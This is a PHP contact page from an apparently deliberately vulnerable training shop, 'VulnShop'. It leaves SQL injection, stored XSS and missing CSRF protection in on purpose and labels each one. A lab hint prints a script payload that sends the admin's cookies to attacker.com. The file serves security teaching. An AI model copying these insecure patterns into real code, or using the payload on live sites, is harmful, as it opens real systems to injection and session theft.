<?php
// ============================================================
//  VulnShop - Contact Page
//  VULNERABILITIES:
//  - Stored XSS: name, subject, message stored raw, echoed in admin panel
//  - SQLi: all fields raw in INSERT
//  - No CSRF token
//  - No spam / rate-limit protection
// ============================================================
$page_title = 'Contact Us';
require_once 'includes/header.php';

$success = '';
$error   = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['send_message'])) {
    $name    = $_POST['name'];
    $email   = $_POST['email'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];

    if (empty($name) || empty($email) || empty($message)) {
        $error = 'Name, email and message are required.';
    } else {
        // VULNERABILITY: all fields raw in INSERT — stored XSS in admin messages view
        db_insert("INSERT INTO messages (name, email, subject, message)
                   VALUES ('$name', '$email', '$subject', '$message')");
        $success = "Thank you, $name! Your message has been sent.";
    }
}
?>

<div class="page-title">
    <h1><i class="fas fa-envelope"></i> Contact Us</h1>
</div>

<div class="contact-layout">
    <div class="contact-form-wrap">

        <?php if ($success): ?>
            <!-- VULNERABILITY: $success echoed raw — stored XSS preview -->
            <div class="alert alert-success"><?php echo $success; ?></div>
        <?php endif; ?>
        <?php if ($error): ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
        <?php endif; ?>

        <div class="lab-hint" style="margin-bottom:20px">
            <h4><i class="fas fa-flask"></i> Stored XSS via Contact Form</h4>
            <p>Submit this as the message to get XSS in the admin panel:</p>
            <code>&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</code>
            <p style="margin-top:6px">Then view the admin Messages tab to trigger it.</p>
        </div>

        <!-- VULNERABILITY: no CSRF token -->
        <form method="POST" class="contact-form">
            <div class="form-row">
                <div class="form-group">
                    <label><i class="fas fa-user"></i> Name *</label>
                    <input type="text" name="name" class="form-control" placeholder="Your name">
                </div>
                <div class="form-group">
                    <label><i class="fas fa-envelope"></i> Email *</label>
                    <input type="text" name="email" class="form-control" placeholder="your@email.com">
                </div>
            </div>
            <div class="form-group">
                <label><i class="fas fa-tag"></i> Subject</label>
                <input type="text" name="subject" class="form-control" placeholder="Message subject">
            </div>
            <div class="form-group">
                <label><i class="fas fa-comment"></i> Message *
                    <small style="color:#e74c3c">(HTML/scripts accepted — stored XSS)</small>
                </label>
                <textarea name="message" rows="6" class="form-control"
                          placeholder="Write your message... HTML tags are allowed ;)"></textarea>
            </div>
            <button type="submit" name="send_message" class="btn btn-primary btn-lg">
                <i class="fas fa-paper-plane"></i> Send Message
            </button>
        </form>
    </div>

    <div class="contact-info">
        <div class="contact-info-card">
            <h3>Get In Touch</h3>
            <p><i class="fas fa-map-marker-alt"></i> 1 Vulnerability Lane, Hacktown, HK 00000</p>
            <p><i class="fas fa-phone"></i> +1 (555) 000-VULN</p>
            <p><i class="fas fa-envelope"></i> support@vulnshop.com</p>
            <p><i class="fas fa-clock"></i> Mon-Fri, 9am-5pm</p>
        </div>

        <div class="contact-info-card" style="margin-top:20px">
            <h3><i class="fas fa-flask"></i> Lab Targets</h3>
            <ul style="list-style:disc;padding-left:20px;line-height:2">
                <li>Contact form → Admin Messages</li>
                <li>Product reviews</li>
                <li>Profile bio field</li>
                <li>Registration username</li>
                <li>Order shipping address</li>
            </ul>
        </div>
    </div>
</div>

<?php require_once 'includes/footer.php'; ?>
